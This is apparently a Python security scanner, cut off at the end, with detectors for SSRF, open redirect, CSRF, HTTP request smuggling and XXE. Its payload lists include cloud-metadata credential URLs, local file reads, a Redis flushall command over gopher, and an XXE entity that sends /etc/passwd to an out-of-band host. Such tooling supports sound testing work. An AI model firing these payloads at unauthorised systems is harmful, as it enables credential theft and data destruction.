"""
Enhanced SSRF Detector with PortSwigger-style bypasses and advanced techniques
"""
import asyncio
import socket
import ipaddress
from typing import List, Optional, Dict, Any
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
from app.detectors.base import Detector, Endpoint, Finding, ValidationResult, Validator
from app.config import settings


class SSRFDetector(Detector):
    name = "ssrf"
    vuln_class = "Server-Side Request Forgery (SSRF)"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
    bugcrowd_vrt_category = "Server-Side Request Forgery (SSRF)"

    # Cloud metadata endpoints
    CLOUD_METADATA = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/project/",
            "http://169.254.169.254/computeMetadata/v1/",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://metadata.azure.com/metadata/instance?api-version=2021-02-01",
        ],
        "digitalocean": [
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1.json",
        ],
        "alibaba": [
            "http://100.100.100.200/latest/meta-data/",
        ],
        "oracle": [
            "http://169.254.169.254/opc/v1/instance/",
        ],
    }

    # All internal IP ranges to test
    INTERNAL_IPS = [
        "127.0.0.1", "127.0.0.2", "127.0.0.3",
        "10.0.0.1", "10.0.0.2", "10.10.10.10",
        "172.16.0.1", "172.16.0.2", "172.31.255.255",
        "192.168.0.1", "192.168.1.1", "192.168.0.2",
        "169.254.169.254", "169.254.169.250",
        "0.0.0.0", "[::1]", "[::ffff:127.0.0.1]",
        "localhost", "localhost.localdomain", "local",
    ]

    # PortSwigger-style bypass techniques
    BYPASS_TECHNIQUES = {
        "decimal_ip": lambda ip: str(int(ipaddress.IPv4Address(ip))) if ':' not in ip and '.' in ip else ip,
        "hex_ip": lambda ip: "0x" + ''.join(f"{int(o):02x}" for o in ip.split('.')) if ':' not in ip and '.' in ip else ip,
        "octal_ip": lambda ip: '.'.join(f"0{oct(int(o))[2:]}" for o in ip.split('.')) if ':' not in ip and '.' in ip else ip,
        "dword_ip": lambda ip: str(sum(int(o) << (8 * (3 - i)) for i, o in enumerate(ip.split('.')))) if ':' not in ip and '.' in ip else ip,
        "dotless": lambda ip: str(int(ipaddress.IPv4Address(ip))) if ':' not in ip and '.' in ip else ip,
        "ipv6_mapped": lambda ip: f"[::ffff:{ip}]" if ':' not in ip and '.' in ip else ip,
        "ipv6_compat": lambda ip: f"[::{ip}]" if ':' not in ip and '.' in ip else ip,
        "cidr": lambda ip: f"{ip}/32" if ':' not in ip and '.' in ip else ip,
        "url_auth": lambda ip: f"{ip}@attacker.com",
        "subdomain": lambda ip: f"{ip}.attacker.com",
        "nip_io": lambda ip: f"{ip}.nip.io",
        "xip_io": lambda ip: f"{ip}.xip.io",
        "sslip_io": lambda ip: f"{ip}.sslip.io",
        "localtest": lambda ip: "localtest.me",
        "redirect": lambda ip: f"http://attacker.com/redirect?url=http://{ip}",
    }

    # Special URLs that resolve to internal IPs
    MAGIC_DOMAINS = [
        "localtest.me",
        "lvh.me",
        "vcap.me",
        "nip.io",
        "xip.io",
        "sslip.io",
        "127.0.0.1.nip.io",
        "127.0.0.1.xip.io",
        "127.0.0.1.sslip.io",
        "localhost.127.0.0.1.nip.io",
    ]

    # Protocols to test
    PROTOCOLS = [
        "http://", "https://", "file://", "gopher://", "dict://", 
        "ftp://", "sftp://", "ldap://", "ldaps://", "tftp://",
    ]

    def __init__(self, http_client, oob_server=None, playwright_browser=None):
        super().__init__(http_client, oob_server, playwright_browser)
        self._tested_payloads: set = set()

    def applies_to(self, endpoint: Endpoint) -> bool:
        return bool(endpoint.params) and endpoint.method in ("GET", "POST")

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        for param in endpoint.params:
            # Test 1: Basic OOB SSRF
            finding = await self._test_oob_ssrf(endpoint, param)
            if finding:
                findings.append(finding)
                continue

            # Test 2: Cloud metadata
            finding = await self._test_cloud_metadata(endpoint, param)
            if finding:
                findings.append(finding)
                continue

            # Test 3: Internal network scanning
            finding = await self._test_internal_scan(endpoint, param)
            if finding:
                findings.append(finding)
                continue

            # Test 4: Protocol handlers
            finding = await self._test_protocols(endpoint, param)
            if finding:
                findings.append(finding)
                continue

            # Test 5: WAF bypasses
            finding = await self._test_waf_bypasses(endpoint, param)
            if finding:
                findings.append(finding)
                continue

            # Test 6: DNS rebinding
            finding = await self._test_dns_rebinding(endpoint, param)
            if finding:
                findings.append(finding)

        return findings

    async def _test_oob_ssrf(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
        if not self.oob_server:
            return None

        token = self.oob_server.generate_token()
        oob_url = f"http://{token}.{self.oob_server.domain}"
        test_url = endpoint.with_param(param, oob_url)

        test = await self._fetch(test_url)
        if not test:
            return None

        validation = Validator.oob_callback_received(self.oob_server, token, timeout=15)
        if validation.confirmed:
            callback = validation.evidence.get("callback", {})
            return self._make_finding(
                endpoint=endpoint,
                param=param,
                confidence="confirmed",
                evidence={
                    "payload": oob_url,
                    "type": "blind_ssrf_oob",
                    "token": token,
                    "callback": callback,
                    "request_url": test_url,
                    "callback_type": callback.get("type", "unknown"),
                },
                summary=f"Blind SSRF in parameter '{param}' (OOB confirmed)",
                description=(
                    f"The parameter '{param}' accepts a URL and the server makes a request to it. "
                    f"An OOB HTTP/DNS callback confirms the server fetches attacker-controlled URLs."
                ),
                steps_to_reproduce=(
                    f"1. Send URL parameter: {oob_url}\n"
                    f"2. Observe callback to OOB server"
                ),
                impact="SSRF allows access to internal services, cloud metadata, and internal network scanning.",
                remediation="Validate URLs against allowlist. Block private IP ranges. Use a dedicated egress proxy. Disable unnecessary protocols (file://, gopher://).",
            )
        return None

    async def _test_cloud_metadata(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
        for provider, urls in self.CLOUD_METADATA.items():
            for target in urls:
                test_url = endpoint.with_param(param, target)
                test = await self._fetch(test_url)
                if not test:
                    continue

                if self._has_cloud_metadata(test["body"], provider):
                    return self._make_finding(
                        endpoint=endpoint,
                        param=param,
                        confidence="confirmed",
                        evidence={
                            "payload": target,
                            "type": "cloud_metadata_ssrf",
                            "provider": provider,
                            "request_url": test_url,
                            "response_status": test["status"],
                            "response_body_snippet": test["body"][:1000],
                        },
                        summary=f"SSRF to {provider.upper()} Cloud Metadata Service in parameter '{param}'",
                        description=(
                            f"The parameter '{param}' allows access to the {provider}'s metadata service "
                            f"({target}). This can leak IAM credentials, instance identity, and network configuration."
                        ),
                        steps_to_reproduce=(f"1. Send metadata URL: {target}\n2. Observe metadata in response"),
                        impact=f"Critical: {provider.upper()} metadata access can lead to full account compromise via IAM role credentials.",
                        remediation="Block all metadata IPs (169.254.169.254, 169.254.169.250). Use IMDSv2 with token requirement. Implement egress filtering.",
                    )
        return None

    def _has_cloud_metadata(self, body: str, provider: str) -> bool:
        indicators = {
            "aws": ["instance-id", "ami-id", "iam/", "security-credentials", "instance-type", "availability-zone"],
            "gcp": ["project-id", "zone", "metadata.google.internal", "instance-id", "service-accounts"],
            "azure": ["subscription-id", "tenant-id", "client-id", "vmId", "resourceGroupName"],
            "digitalocean": ["droplet-id", "region", "floating_ip", "public_ipv4"],
            "alibaba": ["instance-id", "region-id", "zone-id", "vpc-id"],
            "oracle": ["instance-id", "compartment-id", "availability-domain"],
        }
        prov_indicators = indicators.get(provider, [])
        body_lower = body.lower()
        return any(ind in body_lower for ind in prov_indicators)

    async def _test_internal_scan(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
        """Scan internal network for open ports/services"""
        if not self.oob_server:
            return None

        # Test common internal services
        internal_targets = []
        for ip in self.INTERNAL_IPS:
            for port in [22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 9200, 11211]:
                internal_targets.append(f"http://{ip}:{port}")
                internal_targets.append(f"https://{ip}:{port}")

        for target in internal_targets[:50]:  # Limit to prevent excessive requests
            token = self.oob_server.generate_token()
            oob_url = f"http://{token}.{self.oob_server.domain}"
            
            # Use redirect technique
            payload = f"http://attacker.com/redirect?url={target}"
            test_url = endpoint.with_param(param, payload)
            test = await self._fetch(test_url)
            
            if test:
                validation = Validator.oob_callback_received(self.oob_server, token, timeout=10)
                if validation.confirmed:
                    return self._make_finding(
                        endpoint=endpoint,
                        param=param,
                        confidence="confirmed",
                        evidence={
                            "payload": payload,
                            "target": target,
                            "type": "internal_network_scan",
                            "token": token,
                            "callback": validation.evidence.get("callback"),
                        },
                        summary=f"SSRF Internal Network Scan - accessible: {target}",
                        description=(
                            f"The parameter '{param}' can be used to scan internal network services. "
                            f"Service at {target} is accessible via SSRF."
                        ),
                        steps_to_reproduce=(f"1. Send SSRF payload targeting {target}\n2. Observe OOB callback"),
                        impact="Internal network reconnaissance and service enumeration via SSRF.",
                        remediation="Block private IP ranges. Use egress proxy. Implement strict URL validation.",
                    )
        return None

    async def _test_protocols(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
        """Test various protocol handlers"""
        dangerous_protocols = ["file://", "gopher://", "dict://", "ftp://", "ldap://"]
        
        for protocol in dangerous_protocols:
            if protocol == "file://":
                payloads = [
                    "file:///etc/passwd",
                    "file:///c:/windows/win.ini",
                    "file:///etc/hostname",
                    "file:///proc/self/environ",
                ]
            elif protocol == "gopher://":
                payloads = [
                    "gopher://127.0.0.1:22/_test",
                    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
                ]
            elif protocol == "dict://":
                payloads = [
                    "dict://127.0.0.1:6379/info",
                    "dict://127.0.0.1:11211/stats",
                ]
            else:
                payloads = [f"{protocol}127.0.0.1/"]

            for payload in payloads:
                test_url = endpoint.with_param(param, payload)
                test = await self._fetch(test_url)
                if not test:
                    continue

                if protocol == "file://" and ("root:" in test["body"] or "127.0.0.1" in test["body"]):
                    return self._make_finding(
                        endpoint=endpoint,
                        param=param,
                        confidence="confirmed",
                        evidence={
                            "payload": payload,
                            "type": "protocol_handler_ssrf",
                            "protocol": protocol,
                            "request_url": test_url,
                            "response_snippet": test["body"][:500],
                        },
                        summary=f"SSRF via {protocol} protocol handler in parameter '{param}'",
                        description=(
                            f"The parameter '{param}' accepts {protocol} URLs, allowing local file read "
                            f"or internal service access via protocol handler."
                        ),
                        steps_to_reproduce=(f"1. Send {protocol} payload: {payload}\n2. Observe file content in response"),
                        impact=f"Protocol handler {protocol} enables local file read or internal service access.",
                        remediation="Disable dangerous protocol handlers. Use allowlist of allowed protocols (http/https only).",
                    )
        return None

    async def _test_waf_bypasses(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
        """Test PortSwigger-style WAF bypasses"""
        if not self.oob_server:
            return None

        base_url = f"http://127.0.0.1"
        
        for technique_name, technique_func in self.BYPASS_TECHNIQUES.items():
            try:
                bypassed_ip = technique_func(base_url.replace("http://", ""))
                if bypassed_ip == base_url.replace("http://", ""):
                    continue
                
                token = self.oob_server.generate_token()
                oob_url = f"http://{token}.{self.oob_server.domain}"
                
                # Combine bypass with OOB
                if technique_name in ["url_auth", "subdomain"]:
                    payload = technique_func(oob_url.replace("http://", ""))
                else:
                    payload = f"http://{bypassed_ip}"
                    # Also try with OOB
                    payload = f"http://{bypassed_ip}@{oob_url}" if "@" not in bypassed_ip else bypassed_ip
                
                test_url = endpoint.with_param(param, payload)
                test = await self._fetch(test_url)
                if not test:
                    continue

                validation = Validator.oob_callback_received(self.oob_server, token, timeout=10)
                if validation.confirmed:
                    return self._make_finding(
                        endpoint=endpoint,
                        param=param,
                        confidence="confirmed",
                        evidence={
                            "payload": payload,
                            "type": "ssrf_waf_bypass",
                            "technique": technique_name,
                            "bypassed_ip": bypassed_ip,
                            "token": token,
                            "callback": validation.evidence.get("callback"),
                        },
                        summary=f"SSRF with WAF bypass ({technique_name}) in parameter '{param}'",
                        description=(
                            f"The parameter '{param}' has SSRF protection that can be bypassed using "
                            f"{technique_name} technique. The server fetches the attacker-controlled URL."
                        ),
                        steps_to_reproduce=(f"1. Send bypass payload: {payload}\n2. Observe OOB callback"),
                        impact="WAF bypass allows access to internal services despite protection.",
                        remediation="Use proper URL parsing and validation. Resolve hostnames and check IP against denylist. Don't rely on string matching.",
                    )
            except Exception:
                pass
        return None

    async def _test_dns_rebinding(self, endpoint: Endpoint, param: str) -> Optional[Finding]:
        """Test DNS rebinding attack"""
        # This would require a domain that resolves to external IP first, then internal
        # For testing, we note the vulnerability potential
        if not self.oob_server:
            return None

        token = self.oob_server.generate_token()
        # Use a domain that could be configured for rebinding
        payload = f"http://{token}.{self.oob_server.domain}"
        test_url = endpoint.with_param(param, payload)
        test = await self._fetch(test_url)
        
        if not test:
            return None

        # Check for multiple requests (indicating rebinding potential)
        validation = Validator.oob_callback_received(self.oob_server, token, timeout=20)
        if validation.confirmed:
            callback = validation.evidence.get("callback", {})
            # Note: True DNS rebinding detection requires multiple callbacks with different IPs
            return self._make_finding(
                endpoint=endpoint,
                param=param,
                confidence="suspected",
                evidence={
                    "payload": payload,
                    "type": "potential_dns_rebinding",
                    "token": token,
                    "callback": callback,
                    "note": "DNS rebinding suspected - multiple callbacks with different IPs would confirm",
                },
                summary=f"Potential DNS Rebinding SSRF in parameter '{param}'",
                description=(
                    f"The parameter '{param}' may be vulnerable to DNS rebinding. "
                    f"An OOB callback was received, but true DNS rebinding requires "
                    f"verification of multiple IP resolutions."
                ),
                steps_to_reproduce=(
                    f"1. Configure domain to resolve to external IP then 127.0.0.1\n"
                    f"2. Send payload: {payload}\n"
                    f"3. Observe multiple callbacks"
                ),
                impact="DNS rebinding bypasses IP-based SSRF protections by changing DNS resolution.",
                remediation="Pin DNS resolution. Use DNS rebinding protections. Validate IP at time of request.",
            )
        return None

    async def _fetch(self, url: str) -> Optional[Dict[str, Any]]:
        try:
            resp = await self.http_client.get(url, timeout=settings.REQUEST_TIMEOUT, follow_redirects=True)
            return {"status": resp.status_code, "headers": dict(resp.headers), "body": resp.text}
        except Exception:
            return None


class OpenRedirectDetector(Detector):
    name = "open_redirect"
    vuln_class = "Open Redirect"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
    bugcrowd_vrt_category = "Client-Side > Open Redirect"

    # PortSwigger-style open redirect payloads
    PAYLOADS = [
        # Basic
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "\\evil.com",
        # Protocol-relative
        "///evil.com",
        "////evil.com",
        # With @ bypass
        "https://evil.com@target.com",
        "https://target.com@evil.com",
        "https://evil.com%2f@target.com",
        "https://target.com%2fevil.com",
        # Encoded
        "https:%2f%2fevil.com",
        "https:%2f%2f%2fevil.com",
        "https%3a%2f%2fevil.com",
        # JavaScript
        "javascript:alert(1)//",
        "javascript:window.location='https://evil.com'//",
        # Data URI
        "data:text/html,<script>window.location='https://evil.com'</script>",
        # Header injection
        "%0d%0aLocation:%20https://evil.com",
        "%0aLocation:%20https://evil.com",
        # Path traversal
        "/%2e%2e/evil.com",
        "/..;/evil.com",
        # Unicode/IDN
        "https://еvil.com",  # Cyrillic 'е'
        "https://evil。com",  # Full-width dot
    ]

    def applies_to(self, endpoint: Endpoint) -> bool:
        return bool(endpoint.params) and endpoint.method in ("GET", "POST")

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        for param in endpoint.params:
            for payload in self.PAYLOADS:
                test_url = endpoint.with_param(param, payload)
                test = await self._fetch(test_url)
                if not test:
                    continue

                location = test["headers"].get("location", "") or test["headers"].get("Location", "")
                
                # Check for redirect to evil.com
                if "evil.com" in location or "evil.com" in test["body"]:
                    findings.append(self._make_finding(
                        endpoint=endpoint,
                        param=param,
                        confidence="confirmed",
                        evidence={
                            "payload": payload,
                            "redirect_location": location,
                            "request_url": test_url,
                            "response_status": test["status"],
                            "response_body_snippet": test["body"][:500],
                        },
                        summary=f"Open Redirect in parameter '{param}'",
                        description=(
                            f"The parameter '{param}' accepts arbitrary URLs and redirects users without validation. "
                            f"This enables phishing by making malicious links appear to come from the trusted domain."
                        ),
                        steps_to_reproduce=(f"1. Visit: {test_url}\n2. Observe redirect to evil.com"),
                        impact="Phishing, credential theft, bypass of domain-based security controls.",
                        remediation="Validate redirect URLs against an allowlist. Use relative paths only. Show interstitial warning page.",
                    ))
                    break

                # Check for header injection
                if "Location" in test["headers"] and "evil.com" in test["headers"]["Location"]:
                    findings.append(self._make_finding(
                        endpoint=endpoint,
                        param=param,
                        confidence="confirmed",
                        evidence={
                            "payload": payload,
                            "type": "header_injection_redirect",
                            "injected_header": test["headers"]["Location"],
                            "request_url": test_url,
                        },
                        summary=f"Header Injection Redirect in parameter '{param}'",
                        description=(
                            f"The parameter '{param}' allows header injection via CRLF, "
                            f"enabling arbitrary redirect header injection."
                        ),
                        steps_to_reproduce=(f"1. Send payload: {payload}\n2. Observe injected Location header"),
                        impact="Header injection can lead to redirect, cache poisoning, or response splitting.",
                        remediation="Validate and sanitize input. Reject CRLF characters. Use allowlist for redirects.",
                    ))
                    break

        return findings

    async def _fetch(self, url: str) -> Optional[Dict[str, Any]]:
        try:
            resp = await self.http_client.get(url, timeout=settings.REQUEST_TIMEOUT, follow_redirects=False)
            return {"status": resp.status_code, "headers": dict(resp.headers), "body": resp.text}
        except Exception:
            return None


class CSRFDetector(Detector):
    name = "csrf"
    vuln_class = "Cross-Site Request Forgery (CSRF)"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
    bugcrowd_vrt_category = "Client-Side > Cross-Site Request Forgery (CSRF)"

    def applies_to(self, endpoint: Endpoint) -> bool:
        return endpoint.method in ("POST", "PUT", "PATCH", "DELETE") and bool(endpoint.params)

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        # Check for CSRF token
        has_csrf_token = any(
            "csrf" in p.lower() or "token" in p.lower() or "_token" in p.lower()
            for p in endpoint.params
        )

        if has_csrf_token:
            # Still test if token is validated
            finding = await self._test_token_validation(endpoint)
            if finding:
                findings.append(finding)
            return findings

        # Test without origin
        test = await self._fetch_no_origin(endpoint.url, endpoint.params)
        if not test:
            return findings

        if test["status"] in (200, 201, 204, 302):
            findings.append(self._make_finding(
                endpoint=endpoint,
                param="multiple",
                confidence="suspected",
                evidence={
                    "type": "missing_csrf_token",
                    "request_url": endpoint.url,
                    "method": endpoint.method,
                    "response_status": test["status"],
                    "note": "State-changing endpoint lacks CSRF token; manual verification required",
                },
                summary=f"Potential CSRF: State-changing endpoint '{endpoint.method} {endpoint.url}' lacks anti-CSRF token",
                description=(
                    f"The endpoint {endpoint.method} {endpoint.url} performs a state-changing action "
                    f"but does not appear to validate a CSRF token. This may allow cross-site request forgery."
                ),
                steps_to_reproduce=(
                    f"1. Create a page that submits a form to {endpoint.url}\n"
                    f"2. Load page as authenticated user\n"
                    f"3. Observe action executed without user consent"
                ),
                impact="Attackers can perform actions on behalf of authenticated users.",
                remediation="Implement CSRF tokens (synchronizer pattern). Use SameSite=Strict/Lax cookies. Verify Origin/Referer headers.",
            ))

        # Test SameSite bypass
        finding = await self._test_samesite_bypass(endpoint)
        if finding:
            findings.append(finding)

        return findings

    async def _test_token_validation(self, endpoint: Endpoint) -> Optional[Finding]:
        """Test if CSRF token is actually validated"""
        # Try submitting without token or with invalid token
        test_data = {p: endpoint.get_param_value(p) or "test" for p in endpoint.params}
        
        # Remove token fields
        test_data = {k: v for k, v in test_data.items() if "csrf" not in k.lower() and "token" not in k.lower()}
        
        try:
            resp = await self.http_client.post(
                endpoint.url,
                data=test_data,
                headers={"Origin": "https://evil.com", "Referer": "https://evil.com/page.html"},
                timeout=settings.REQUEST_TIMEOUT,
            )
            if resp.status_code in (200, 201, 204, 302):
                return self._make_finding(
                    endpoint=endpoint,
                    param="csrf_token",
                    confidence="confirmed",
                    evidence={
                        "type": "csrf_token_not_validated",
                        "request_url": endpoint.url,
                        "method": endpoint.method,
                        "response_status": resp.status_code,
                    },
                    summary=f"CSRF Token Not Validated in '{endpoint.method} {endpoint.url}'",
                    description=(
                        f"The endpoint has a CSRF token parameter but does not validate it. "
                        f"Requests without a valid token are accepted."
                    ),
                    steps_to_reproduce=(
                        f"1. Submit form without CSRF token\n"
                        f"2. Observe action executed successfully"
                    ),
                    impact="CSRF protection is present but ineffective.",
                    remediation="Ensure CSRF tokens are validated on every state-changing request.",
                )
        except Exception:
            pass
        return None

    async def _test_samesite_bypass(self, endpoint: Endpoint) -> Optional[Finding]:
        """Test SameSite cookie bypass techniques"""
        # Test with lax + GET method override
        test_data = {p: endpoint.get_param_value(p) or "test" for p in endpoint.params}
        test_data["_method"] = "POST"  # Method override
        
        try:
            resp = await self.http_client.post(
                endpoint.url,
                data=test_data,
                headers={"Origin": "https://evil.com", "Referer": "https://evil.com/page.html"},
                timeout=settings.REQUEST_TIMEOUT,
            )
            if resp.status_code in (200, 201, 204, 302):
                return self._make_finding(
                    endpoint=endpoint,
                    param="_method",
                    confidence="suspected",
                    evidence={
                        "type": "samesite_bypass_method_override",
                        "request_url": endpoint.url,
                        "response_status": resp.status_code,
                    },
                    summary=f"Potential SameSite Bypass via Method Override in '{endpoint.method} {endpoint.url}'",
                    description=(
                        f"The endpoint accepts method override (_method=POST) which may bypass "
                        f"SameSite=Lax protection on GET requests."
                    ),
                    steps_to_reproduce=(
                        f"1. Send GET request with _method=POST parameter\n"
                        f"2. Observe state-changing action executed"
                    ),
                    impact="SameSite=Lax bypass via method override.",
                    remediation="Don't allow method override on GET requests. Validate HTTP method strictly.",
                )
        except Exception:
            pass
        return None

    async def _fetch_no_origin(self, url: str, params: List[str]) -> Optional[Dict[str, Any]]:
        try:
            data = {p: "test" for p in params}
            resp = await self.http_client.post(
                url,
                data=data,
                headers={"Origin": "https://evil.com", "Referer": "https://evil.com/page.html"},
                timeout=settings.REQUEST_TIMEOUT,
            )
            return {"status": resp.status_code, "headers": dict(resp.headers), "body": resp.text}
        except Exception:
            return None


class HTTPRequestSmugglingDetector(Detector):
    name = "http_request_smuggling"
    vuln_class = "HTTP Request Smuggling"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
    bugcrowd_vrt_category = "Server-Side > HTTP Request Smuggling"

    SMUGGLING_PAYLOADS = {
        "CL.TE": (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: {cl}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "SMUGGLED"
        ),
        "TE.CL": (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Length: {cl}\r\n"
            "\r\n"
            "5\r\n"
            "SMUG\r\n"
            "0\r\n"
            "\r\n"
        ),
        "TE.TE": (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: x\r\n"
            "\r\n"
            "5\r\n"
            "SMUG\r\n"
            "0\r\n"
            "\r\n"
        ),
    }

    def applies_to(self, endpoint: Endpoint) -> bool:
        return endpoint.method in ("GET", "POST")

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []
        parsed = urlparse(endpoint.url)
        host = parsed.netloc

        for variant, template in self.SMUGGLING_PAYLOADS.items():
            # Calculate Content-Length for the smuggled part
            smuggled = "SMUGGLED" if variant == "CL.TE" else "SMUG"
            cl = len(smuggled)
            
            payload = template.format(host=host, cl=cl)
            finding = await self._test_smuggling(endpoint, variant, payload)
            if finding:
                findings.append(finding)

        return findings

    async def _test_smuggling(self, endpoint: Endpoint, variant: str, payload: str) -> Optional[Finding]:
        try:
            parsed = urlparse(endpoint.url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)

            sock = socket.create_connection((host, port), timeout=10)
            if parsed.scheme == "https":
                import ssl
                sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)

            sock.sendall(payload.encode())
            response = sock.recv(8192).decode(errors="ignore")
            sock.close()

            # Check for desync indicators
            indicators = [
                "SMUGGLED" in response,
                "SMUG" in response,
                "400" not in response and "500" not in response,
                "unexpected" in response.lower(),
                "malformed" in response.lower(),
            ]

            if any(indicators):
                return self._make_finding(
                    endpoint=endpoint,
                    param=None,
                    confidence="suspected",
                    evidence={
                        "variant": variant,
                        "payload": payload[:200],
                        "response_snippet": response[:500],
                        "indicators": [i for i, v in enumerate(indicators) if v],
                        "note": "Differential response suggests desync; manual verification required",
                    },
                    summary=f"Potential HTTP Request Smuggling ({variant})",
                    description=(
                        f"The server may be vulnerable to {variant} HTTP request smuggling. "
                        f"Ambiguous Content-Length and Transfer-Encoding headers can cause "
                        f"front-end/back-end desynchronization."
                    ),
                    steps_to_reproduce=(f"1. Send crafted {variant} request\n2. Observe desynchronized responses"),
                    impact="Request smuggling can bypass security controls, poison cache, and hijack sessions.",
                    remediation="Use HTTP/2 end-to-end. Reject requests with both CL and TE. Normalize headers. Upgrade frontend/backend.",
                )
        except Exception:
            pass
        return None


class XXEDetector(Detector):
    name = "xxe"
    vuln_class = "XML External Entity Injection (XXE)"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    bugcrowd_vrt_category = "Injection > XML External Entity Injection (XXE)"

    XXE_PAYLOADS = {
        "file_read": [
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>''',
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>''',
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>''',
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>''',
        ],
        "oob": [
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{token}.{domain}/xxe.dtd"> %remote;]><root>&exfil;</root>''',
        ],
        "parameter_entity": [
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{token}.{domain}/?x=%file;'>">%eval;%exfil;]>''',
        ],
        "dos": [
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY a "AAAAAAAAAAAAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]><root>&b;</root>''',
        ],
        "svg": [
            '''<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg xmlns="http://www.w3.org/2000/svg" width="500" height="500"><text x="10" y="20">&xxe;</text></svg>''',
        ],
    }

    def applies_to(self, endpoint: Endpoint) -> bool:
        return endpoint.method in ("POST", "PUT", "PATCH")

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        # Check if endpoint accepts XML
        content_type = endpoint.headers.get("content-type", "").lower()
        accepts_xml = "xml" in content_type or "soap" in content_type

        for param in endpoint.params:
            # Test file read
            finding = await self._test_xxe_type(endpoint, param, "file_read", accepts_xml)
            if finding:
                findings.append(finding)
                continue

            # Test OOB
            if self.oob_server:
                finding = await self._test_xxe_type(endpoint, param, "oob", accepts_xml)
                if finding:
                    findings.append(finding)
                    continue

                finding = await self._test_xxe_type(endpoint, param, "parameter_entity", accepts_xml)
                if finding:
                    findings.append(finding)
                    continue

            # Test DoS (carefully)
            finding = await self._test_xxe_type(endpoint, param, "dos", accepts_xml)
            if finding:
                findings.append(finding)

            # Test SVG XXE
            finding = await self._test_xxe_type(endpoint, param, "svg", accepts_xml)
            if finding:
                findings.append(finding)

        return findings

    async def _test_xxe_type(self, endpoint: Endpoint, param: str, xxe_type: str, accepts_xml: bool) -> Optional[Finding]:
        if xxe_type in ["oob", "parameter_entity"] and not self.oob_server:
            return None

        payloads = self.XXE_PAYLOADS.get(xxe_type, [])
        
        for payload_template in payloads:
            if "{token}" in payload_template and self.oob_server:
                token = self.oob_server.generate_token()
                payload = payload_template.format(token=token, domain=self.oob_server.domain)
            else:
                payload = payload_template

            # Set appropriate content type
            if xxe_type == "svg":
                content_type = "image/svg+xml"
            else:
                content_type = "application/xml"

            test = await self._post_xml(endpoint.url, payload, content_type)
            if not test:
                continue

            if xxe_type == "file_read":
                # Check for file content in response
                indicators = ["root:", "bin/bash", "bin/sh", "daemon:", "nobody:", "[extensions]", "windows"]
                if any(ind in test["body"] for ind in indicators):
                    return self._make_finding(
                        endpoint=endpoint,
                        param=param,
                        confidence="confirmed",
                        evidence={
                            "payload": payload[:200],
                            "type": "xxe_file_read",
                            "request_url": endpoint.url,
                            "response_snippet": test["body"][:500],
                        },
                        summary=f"XXE Local File Read in parameter '{param}'",
                        description=(
                            f"The XML parser processes external entities, allowing an attacker to "
                            f"read local files such as /etc/passwd."
                        ),
                        steps_to_reproduce=(f"1. Send XXE payload with file:// entity\n2. Observe file content in response"),
                        impact="XXE allows local file read, SSRF, and DoS via entity expansion.",
                        remediation="Disable external entity processing. Use safe parser configurations. Validate XML against schema.",
                    )

            elif xxe_type in ["oob", "parameter_entity"]:
                validation = Validator.oob_callback_received(self.oob_server, token, timeout=15)
                if validation.confirmed:
                    callback = validation.evidence.get("callback", {})
                    return self._make_finding(
                        endpoint=endpoint,
                        param=param,
